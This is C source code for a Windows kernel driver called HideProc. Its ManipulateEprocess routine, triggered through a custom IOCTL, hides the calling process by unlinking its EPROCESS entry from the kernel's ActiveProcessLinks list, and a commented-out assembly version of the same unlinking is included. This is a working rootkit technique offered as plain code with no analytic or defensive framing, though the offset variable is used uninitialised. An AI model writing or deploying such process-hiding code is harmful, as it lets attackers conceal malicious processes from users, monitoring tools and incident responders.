
#include <ntddk.h>
typedef void (*FunctionPointer)();
NTSTATUS   ManipulateEprocess(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp);

#define IOCTL_FOR_HIDEPROC   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)



DRIVER_INITIALIZE    DriverEntry;
DRIVER_UNLOAD        IrpUnloadHandler;
DRIVER_DISPATCH      IrpNotImplementedHandler;

__drv_dispatchType(IRP_MJ_CREATE)
__drv_dispatchType(IRP_MJ_CLOSE)         DRIVER_DISPATCH    IrpCreateCloseHandler;
__drv_dispatchType(IRP_MJ_DEVICE_CONTROL)    DRIVER_DISPATCH    IrpDeviceIoCtlHandler;

VOID        IrpUnloadHandler(IN PDRIVER_OBJECT DriverObject);
NTSTATUS    IrpCreateCloseHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS    IrpDeviceIoCtlHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS    IrpNotImplementedHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp);
NTSTATUS    DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath);

#ifdef ALLOC_PRAGMA
    #pragma alloc_text(PAGE, ManipulateEprocess)
    #pragma alloc_text(INIT, DriverEntry)
    #pragma alloc_text(PAGE, IrpUnloadHandler)
    #pragma alloc_text(PAGE, IrpCreateCloseHandler)
    #pragma alloc_text(PAGE, IrpDeviceIoCtlHandler)
    #pragma alloc_text(PAGE, IrpNotImplementedHandler)
	
#endif // ALLOC_PRAGMA



NTSTATUS ManipulateEprocess(IN PIRP Irp, IN PIO_STACK_LOCATION IrpSp) {
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
	PEPROCESS Process ;
	PULONG ptr;
	ULONG offset,i;
	PLIST_ENTRY Prev,Curr,Next;
	HANDLE PID;
	
 /*   __asm{
		pushad
		mov eax, fs:0x00000124
		mov eax, [eax + 0x44]
		mov ecx, [eax+8Ch]		
		add eax, 88h
		mov edx, [eax]
		mov [ecx], edx
		mov ecx, [eax]
		mov eax, [eax+4]
		mov [ecx+4], eax
		popad
	}
*/
	//Getting EPROCESS object of current process
	Process = PsGetCurrentProcess();
	PID = PsGetProcessId(Process);
	ptr=(PULONG)Process;
	//Getting the ActiveProcessLink offset
	for(i=0;i<512;i++)
    {
		if(ptr[i]==(ULONG)PID)
        {
			offset=(ULONG)&ptr[i+1]-(ULONG)Process; // ActiveProcessLinks is located next to the PID
			DbgPrint("ActiveProcessLinks offset: %#x",offset);
            break;
        }
    }
	
	//Cheking if we are good so far !
    if(!offset)
    {
        Status=STATUS_UNSUCCESSFUL;
    }
	
	Curr=(PLIST_ENTRY)((PUCHAR)Process+offset); // Get the ActiveProcessLinks address
    Prev=Curr->Blink;
    Next=Curr->Flink;
 
    // Unlink the target process 
 
    Prev->Flink=Curr->Flink;
    Next->Blink=Curr->Blink;
 
    // Adjust  Flink and Blink
 
    Curr->Flink=Curr;
    Curr->Blink=Curr;
 
    Status=STATUS_SUCCESS;

    return Status;
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath) {
    UINT32 i = 0;
    PDEVICE_OBJECT DeviceObject = NULL;
    NTSTATUS Status = STATUS_UNSUCCESSFUL;
    UNICODE_STRING DeviceName, DosDeviceName = {0};

    UNREFERENCED_PARAMETER(RegistryPath);
    PAGED_CODE();

    RtlInitUnicodeString(&DeviceName, L"\\Device\\HideProc");
    RtlInitUnicodeString(&DosDeviceName, L"\\DosDevices\\HideProc");

    // Create the device
    Status = IoCreateDevice(DriverObject,
                            0,
                            &DeviceName,
                            FILE_DEVICE_UNKNOWN,
                            FILE_DEVICE_SECURE_OPEN,
                            FALSE,
                            &DeviceObject);

    if (!NT_SUCCESS(Status)) {
        if (DeviceObject) {
            // Delete the device
            IoDeleteDevice(DeviceObject);
        }

        DbgPrint("[-] Error Initializing  Driver\n");
        return Status;
    }

    // Assign the IRP handlers
    for (i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++) {
        // Disable the Compiler Warning: 28169
        #pragma warning(push)
        #pragma warning(disable : 28169)
        DriverObject->MajorFunction[i] = IrpNotImplementedHandler;
        #pragma warning(pop)
    }

    // Assign the IRP handlers for Create, Close and Device Control
    DriverObject->MajorFunction[IRP_MJ_CREATE]         = IrpCreateCloseHandler;
    DriverObject->MajorFunction[IRP_MJ_CLOSE]          = IrpCreateCloseHandler;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceIoCtlHandler;

    // Assign the driver Unload routine
    DriverObject->DriverUnload = IrpUnloadHandler;

    // Set the flags
    DeviceObject->Flags |= DO_DIRECT_IO;
    DeviceObject->Flags &= ~DO_DEVICE_INITIALIZING;

    // Create the symbolic link
    Status = IoCreateSymbolicLink(&DosDeviceName, &DeviceName);

    // Show the banner
    DbgPrint("[+] Driver Loaded\n");

    return Status;
}

NTSTATUS IrpCreateCloseHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {
    Irp->IoStatus.Information = 0;
    Irp->IoStatus.Status = STATUS_SUCCESS;

    UNREFERENCED_PARAMETER(DeviceObject);
    PAGED_CODE();

    // Complete the request
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}


VOID IrpUnloadHandler(IN PDRIVER_OBJECT DriverObject) {
    UNICODE_STRING DosDeviceName = {0};

    PAGED_CODE();

    RtlInitUnicodeString(&DosDeviceName, L"\\DosDevices\\HideProc");

    // Delete the symbolic link
    IoDeleteSymbolicLink(&DosDeviceName);

    // Delete the device
    IoDeleteDevice(DriverObject->DeviceObject);

    DbgPrint("[-]Driver Unloaded\n");
}


NTSTATUS IrpNotImplementedHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {
    Irp->IoStatus.Information = 0;
    Irp->IoStatus.Status = STATUS_NOT_SUPPORTED;

    UNREFERENCED_PARAMETER(DeviceObject);
    PAGED_CODE();

    // Complete the request
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return STATUS_NOT_SUPPORTED;
}


NTSTATUS IrpDeviceIoCtlHandler(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp) {
    ULONG IoControlCode = 0;
    PIO_STACK_LOCATION IrpSp = NULL;
    NTSTATUS Status = STATUS_NOT_SUPPORTED;

    UNREFERENCED_PARAMETER(DeviceObject);
    PAGED_CODE();

    IrpSp = IoGetCurrentIrpStackLocation(Irp);
    IoControlCode = IrpSp->Parameters.DeviceIoControl.IoControlCode;

    if (IrpSp) {
        switch (IoControlCode) {
            case IOCTL_FOR_HIDEPROC:
                Status = ManipulateEprocess(Irp, IrpSp);
                
                break;
            default:
                DbgPrint("[-] Invalid IOCTL Code: 0x%X\n", IoControlCode);
                Status = STATUS_INVALID_DEVICE_REQUEST;
                break;
        }
    }

    Irp->IoStatus.Status = Status;
    Irp->IoStatus.Information = 0;

    // Complete the request
    IoCompleteRequest(Irp, IO_NO_INCREMENT);

    return Status;
}
